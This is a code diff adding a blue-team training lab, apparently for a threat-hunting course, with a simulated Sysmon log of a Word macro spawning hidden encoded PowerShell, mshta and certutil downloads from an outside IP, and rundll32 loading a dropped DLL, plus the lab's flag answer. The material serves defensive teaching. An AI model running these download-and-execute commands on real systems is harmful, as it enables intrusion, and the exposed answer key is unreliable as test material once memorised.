@@ -256,7 +256,45 @@ const lab6 = {
   },
 };
 
-const labs = [lab1, lab2, lab3, lab4, lab5, lab6];
+// ---------------------------------------------------------------------------
+// Lab 7: Sysmon / EDR Threat Hunting — process injection & LOLBins
+// ---------------------------------------------------------------------------
+const SYSMON_LOG = `# Sysmon process_creation events (EventID 1)
+time      pid    image                                                   parent            cmdline
+09:00:01  1204   C:\\Windows\\explorer.exe                                 -                 explorer.exe
+09:02:11  2288   C:\\Program Files\\Office\\WINWORD.EXE                     explorer.exe      "WINWORD.EXE" /n Invoice.docm
+09:02:40  3012   C:\\Windows\\System32\\cmd.exe                            WINWORD.EXE       cmd /c powershell -nop -w hidden -enc SQBFAFgA
+09:02:41  3120   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  cmd.exe     powershell -nop -w hidden -enc SQBFAFgA
+09:03:05  3260   C:\\Windows\\System32\\mshta.exe                          powershell.exe    mshta http://45.9.12.7/a.hta
+09:03:44  3401   C:\\Windows\\System32\\rundll32.exe                       powershell.exe    rundll32 C:\\Users\\Public\\p.dll,Run
+09:04:10  3502   C:\\Windows\\System32\\certutil.exe                       powershell.exe    certutil -urlcache -f http://45.9.12.7/x.exe x.exe
+09:05:22  3610   C:\\Windows\\System32\\notepad.exe                        explorer.exe      notepad.exe report.txt
+09:06:00  3702   C:\\Windows\\System32\\svchost.exe                        services.exe      svchost.exe -k netsvcs`;
+
+const lab7 = {
+  slug: 'sysmon-threat-hunting',
+  title: 'Terminal: Sysmon Threat Hunting',
+  description: 'Hunt an endpoint compromise in Sysmon logs. Use the terminal to trace the Office → PowerShell chain and the living-off-the-land binaries (LOLBins) the attacker abused.',
+  difficulty: 'hard',
+  category: 'blue',
+  tags: ['Threat Hunting', 'Sysmon', 'EDR', 'LOLBins', 'Windows'],
+  icon: 'Terminal',
+  points: 80,
+  flag: 'BTLAB{certutil.exe}',
+  objectives: [
+    'Find the malicious parent process that spawned a shell (grep WINWORD)',
+    'Trace the PowerShell child processes (grep powershell.exe)',
+    'Identify the LOLBin used to DOWNLOAD a payload (grep for urlcache / http)',
+    'Submit the flag: BTLAB{lolbin_used_to_download}',
+  ],
+  welcome: 'Hunt the endpoint compromise in sysmon.log. Type `help`, then `ls`. LOLBins = legit Windows binaries abused by attackers.',
+  fs: {
+    'sysmon.log': SYSMON_LOG,
+    'README': 'Files:\n  sysmon.log - Sysmon EventID 1 (process creation)\n\nHunt the chain: WINWORD.EXE -> cmd -> powershell -> [LOLBins].\nLOLBins to know: mshta, rundll32, certutil. Which one DOWNLOADS a file?\nHint: certutil with -urlcache -f is a classic download technique.',
+  },
+};
+
+const labs = [lab1, lab2, lab3, lab4, lab5, lab6, lab7];
 labs.forEach((l, i) => { l.id = i + 1; });
 
 // ---------------------------------------------------------------------------
